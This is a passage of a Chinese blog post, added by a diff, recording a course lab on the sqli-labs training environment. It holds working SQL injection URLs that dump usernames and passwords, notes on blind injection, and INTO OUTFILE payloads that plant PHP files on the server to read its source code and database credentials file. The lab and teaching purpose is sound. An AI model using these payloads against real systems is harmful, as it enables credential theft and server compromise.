@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/pig_128x128.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/pig_32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/pig_16x16.ico">
+  <link rel="mask-icon" href="/images/pig_128x128.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rotoro Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"slient2009.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="很久之前的实训课程实验记录，权当凑数。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL,XSS,文件上传实验记录">
+<meta property="og:url" content="http://slient2009.github.io/2021/11/22/Web-Labs/index.html">
+<meta property="og:site_name" content="Slient2009">
+<meta property="og:description" content="很久之前的实训课程实验记录，权当凑数。">
+<meta property="og:locale" content="ja_JP">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185241263.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185203312.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185303420.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221315153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221822503.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221834365.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222222788.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222415460.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223437960.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223722924.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223712801.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224157880.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224319439.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126190149545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126193130954.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126201348544.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094329018.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094347246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204229902.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204246514.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094740436.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126205514505.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126220832111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222034823.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222837646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127103843514.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110111890.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110313357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110922998.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163052801.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163743773.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174352569.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174606873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127175332286.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127181919126.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127202028435.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127200552580.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204937987.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204824111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127205230525.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213608048.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213523251.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233829160.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233955698.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111106471.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715144909149.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128120223330.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715151535637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111939700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715152933866.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160658462.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160638311.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113421841.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113531000.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128112539027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114131808.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114214613.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114408003.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204721930.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204737776.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204810094.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210259484.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210328418.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210549269.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716114658159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115239376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115638195.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717095509735.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171741323.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716172253219.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173641821.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173618738.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716193252913.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716200635567.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716202858396.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212245934.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212132927.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716213324517.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716223751307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716224345049.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232433594.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232619081.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716233256871.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717102154922.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717103529716.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143714809.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143646731.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162914017.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162713518.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718150214528.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718145457471.png">
+<meta property="article:published_time" content="2021-11-22T05:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-10T17:14:41.000Z">
+<meta property="article:author" content="slient2009">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185241263.png">
+
+<link rel="canonical" href="http://slient2009.github.io/2021/11/22/Web-Labs/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'ja'
+  };
+</script>
+
+  <title>SQL,XSS,文件上传实验记录 | Slient2009</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="ナビゲーションバーの切り替え">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Slient2009</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">All I need is Twin Island Milk</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>ホーム</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>プロフィール</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>タグ<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>アーカイブ<span class="badge">13</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="ja">
+    <link itemprop="mainEntityOfPage" href="http://slient2009.github.io/2021/11/22/Web-Labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/round_tiger.png">
+      <meta itemprop="name" content="slient2009">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Slient2009">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL,XSS,文件上传实验记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">投稿日</span>
+
+              <time title="作成日：2021-11-22 00:00:00" itemprop="dateCreated datePublished" datetime="2021-11-22T00:00:00-05:00">2021-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">編集日</span>
+                <time title="修正日：2021-12-10 12:14:41" itemprop="dateModified" datetime="2021-12-10T12:14:41-05:00">2021-12-10</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="閲覧数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">閲覧数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>很久之前的实训课程实验记录，权当凑数。</p>
+<span id="more"></span>
+
+<h2 id="SQL-Lab"><a href="#SQL-Lab" class="headerlink" title="SQL-Lab"></a>SQL-Lab</h2><h3 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h3><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185241263.png" alt="image-20201126185241263"></p>
+<p><strong>information_schema</strong></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185203312.png" alt="image-20201126185203312"></p>
+<p><strong>security</strong></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185303420.png" alt="image-20201126185303420"></p>
+<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><h4 id="检查是否存在注入点"><a href="#检查是否存在注入点" class="headerlink" title="检查是否存在注入点"></a>检查是否存在注入点</h4><p>一般直接加引号<code>&#39;</code>，也可以考虑宽字符闭合引号。<br>这里一试就报错发现有注入点。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221315153.png" alt="image-20200714221315153"></p>
+<h4 id="检查关键字过滤"><a href="#检查关键字过滤" class="headerlink" title="检查关键字过滤"></a>检查关键字过滤</h4><p>一般来说会过滤一些关键字，诸如select、union、where等。<br>如果有过滤就要使用一些绕过手段，比如双写绕过、注释绕过等，本次课程还未涉及所以不讨论。<br>事实上还有关于注释符的过滤，绕过方法也有很多。（如果过滤规则不是很严的话）</p>
+<h4 id="判断回显"><a href="#判断回显" class="headerlink" title="判断回显"></a>判断回显</h4><p>确定sql查询语句有多少回显位，一般使用order by 语句二分确定回显位。<br>这里可以确定有4个回显位。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221822503.png" alt="image-20200714221822503"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221834365.png" alt="image-20200714221834365"></p>
+<h4 id="查出相关参数"><a href="#查出相关参数" class="headerlink" title="查出相关参数"></a>查出相关参数</h4><p>一般不急着查information_schema那几张表，先看看database() user()之类的函数结果。<br>这里先看到数据库名和用户名。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222222788.png" alt="image-20200714222222788"></p>
+<h4 id="查information-schema"><a href="#查information-schema" class="headerlink" title="查information_schema"></a>查information_schema</h4><p>先要明确information_schema里面有什么内容</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222415460.png" alt="image-20200714222415460"></p>
+<h4 id="根据得到的数据库名查表和列"><a href="#根据得到的数据库名查表和列" class="headerlink" title="根据得到的数据库名查表和列"></a>根据得到的数据库名查表和列</h4><p><code>id=-1&#39; union select 1,group_concat(schema_name),2 from information_schema.schemata where &#39;1&#39;=&#39;1</code><br>直接出所有数据库名<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223437960.png" alt="image-20200714223437960"></p>
+<h4 id="拿到security下的所有表"><a href="#拿到security下的所有表" class="headerlink" title="拿到security下的所有表"></a>拿到security下的所有表</h4><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223722924.png" alt="image-20200714223722924"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223712801.png" alt="image-20200714223712801"></p>
+<h4 id="继续查表"><a href="#继续查表" class="headerlink" title="继续查表"></a>继续查表</h4><p>大概对users表感兴趣，那就看看users下面都有哪些字段，然后顺手读出来。<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224157880.png" alt="image-20200714224157880"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224319439.png" alt="image-20200714224319439"></p>
+<p>于是第一关完成</p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-2/?id=2111111%20union%20select%20user(),group_concat(password),group_concat(username)%20from%20users%20order%20by%203</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126190149545.png" alt="image-20201126190149545"></p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>闭合<code>(&#39;</code>,然后用–+注释之后的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-3/?id=-111%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126193130954.png" alt="image-20201126193130954"></p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>闭合<code>(&quot;</code>,然后用–+注释之后的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-4/?id=-9%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126201348544.png" alt="image-20201126201348544"></p>
+<h3 id="Less-5-布尔注入"><a href="#Less-5-布尔注入" class="headerlink" title="Less-5 布尔注入"></a>Less-5 布尔注入</h3><p>首先要还是要确定注入类型，如字符型、数字型，然后构造条件。</p>
+<p>这里用left函数取单个字符来确定整个字符串的取值，由二分可知database()的第一个字符为’s’。</p>
+<p>先通过简单的测试得知这里有注入点，而且因为只有两种回显状态，所以应该是bool注入。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094329018.png" alt="image-20201128094329018"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094347246.png" alt="image-20201128094347246"></p>
+<p>以上的<code>1=2</code>和<code>1=1</code>的语句是被执行了的，下面将其替换为其他语句猜解关键信息。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204229902.png" alt="image-20201126204229902"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204246514.png" alt="image-20201126204246514"></p>
+<p>更详细一点儿，还可以通过length函数先确定一下database()的长度。</p>
+<p>除了上述的带boolean回显的二分盲注，还可以通过使用sleep()的时间盲注，或者基于笛卡尔积的时间盲注。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094740436.png" alt="image-20201128094740436"></p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>类似于Less-5,只是换成了双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-6/?id=-1%22%20or%20left(database(),1)=%27s%27--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126205514505.png" alt="image-20201126205514505"></p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>记得打开<code>secure-file-priv=&quot;&quot;</code></p>
+<p>由提示,需要用到外部文件,先利用less-1搞清楚工作目录</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126220832111.png" alt="image-20201126220832111"></p>
+<p>然后利用MySQL文件操作在目录下面写一个php一句话木马<br>目录指定为<code>D:\phpStudy\sqli-labs\horse1.php</code><br>为了获取Less-7的源码,木马内容先写成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;D:\\phpStudy\\WWW\\sqli-labs\Less-7\index.php&quot;</span>; <span class="comment">#也可能是index.html,这里是试出来的,且注意转义</span></span><br><span class="line"><span class="variable">$h</span>=fopen(<span class="variable">$f</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=fread(<span class="variable">$h</span>,filesize(<span class="variable">$f</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">fclose(<span class="variable">$h</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- payload --&gt;</span></span><br><span class="line">http://192.168.218.133/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\index.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);%20?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse1.php%22%20--+</span><br></pre></td></tr></table></figure>
+
+<p>虽然页面上还是返回Error,但是实际上是写入成功的,接下来访问horse1.php<br>这里相当于用一个php 输出了另外一个html+php文件的内容,所以浏览器会自动解析,文件的具体内容在开发者工具里面查看</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222034823.png" alt="image-20201126222034823"></p>
+<p>可以看到Less-7 index.php的源代码,包括Sql语句的拼接方式,这里解释了为什么要闭合双括号.<br>同时,可以看到php包含了sql-connect.php来连接数据库,于是再用类似的方法查看sql-connect.php的源代码</p>
+<p>向目录下写入木马horse2.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f=&quot;D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php&quot;;</span><br><span class="line">$h=fopen($f,&quot;r&quot;);</span><br><span class="line">$c=fread($h,filesize($f));</span><br><span class="line">echo $c;</span><br><span class="line">fclose($h);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- payload --&gt;</span></span><br><span class="line">http://192.168.218.133/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse2.php%22%20--+</span><br></pre></td></tr></table></figure>
+
+<p>访问horse2.php</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222837646.png" alt="image-20201126222837646"></p>
+<p>发现sql-connect.php又包含了一个db-creds.inc配置文件来连接数据库,于是故技重施,去查看这个文件的源代码</p>
+<p>向目录下写入木马horse3.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\db-creds.inc&quot;</span>;</span><br><span class="line"><span class="variable">$h</span>=fopen(<span class="variable">$f</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=fread(<span class="variable">$h</span>,filesize(<span class="variable">$f</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">fclose(<span class="variable">$h</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
